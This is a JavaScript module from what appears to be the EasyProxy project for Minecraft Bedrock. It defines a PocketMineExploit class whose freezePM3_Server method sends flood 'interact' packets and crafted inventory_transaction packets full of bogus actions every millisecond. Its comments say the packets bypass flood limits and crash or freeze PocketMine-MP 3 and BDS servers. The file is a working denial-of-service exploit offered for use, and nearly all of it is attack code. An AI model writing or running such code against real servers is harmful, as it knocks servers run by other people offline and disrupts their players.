/**
 *
 *  ███████╗ █████╗ ███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ██╗  ██╗██╗   ██╗
 *  ██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝
 *  █████╗  ███████║███████╗ ╚████╔╝ ██████╔╝██████╔╝██║   ██║ ╚███╔╝  ╚████╔╝
 *  ██╔══╝  ██╔══██║╚════██║  ╚██╔╝  ██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗   ╚██╔╝
 *  ███████╗██║  ██║███████║   ██║   ██║     ██║  ██║╚██████╔╝██╔╝ ██╗   ██║
 *  ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝
 *
 *  Release by EasyProxy's Project!
 *  Github: https://https://github.com/Zwuiix-cmd/EasyProxy
 *
 */

class PocketMineExploit
{
    player;

    actions = [];

    sliderExploit = false;
    bigFormExploit = false;

    formExploit = {};

    /** @param player {Player} */
    constructor(player)
    {
        this.player = player;
    }

    /**
     * @return {boolean}
     */
    isSliderExploit()
    {
        return this.sliderExploit;
    }

    /**
     * @param bool {boolean}
     */
    setSliderExploit(bool)
    {
        this.sliderExploit=bool;
    }

    isBigFormExploit()
    {
        return this.bigFormExploit;
    }

    /**
     * @param bool {boolean}
     */
    setBigFormExploit(bool)
    {
        this.bigFormExploit=bool;
    }

    /**
     * @return {{}}
     */
    getFormExploit()
    {
        return this.formExploit;
    }

    /**
     * @param formData {Object}
     */
    setFormExploit(formData)
    {
        this.formExploit=formData;
    }

    /**
     * @param count {number}
     */
    generatePM3_FreezeActions(count)
    {
        for (let i = 0; i < count; i++) this.actions.push({source_type: "container", inventory_id: 0, slot: 28, old_item: {network_id: 0}, new_item: {network_id: 0}});
    }

    freezePM3_Server()
    {
        // TODO: FREEZE ONLY PM3 SERVERS (PM4 PATCHED)
        // TODO: On BDS or BDSX it also works very well!
        setInterval(async () => {

            // TODO: BYPASS FLOOD PACKET
            this.player.getBedrockPlayer().upstream.queue('interact', {
                action_id:"mouse_over_entity",
                target_entity_id:0,
                position: {x:0,y:0,z:0}
            });

            // TODO: CRASH PACKET
            this.player.getBedrockPlayer().upstream.queue('inventory_transaction', {
                transaction: {
                    legacy: {legacy_request_id: 0},
                    transaction_type: "normal",
                    actions: this.actions
                }
            });
        }, 1);
    }
}

module.exports = PocketMineExploit;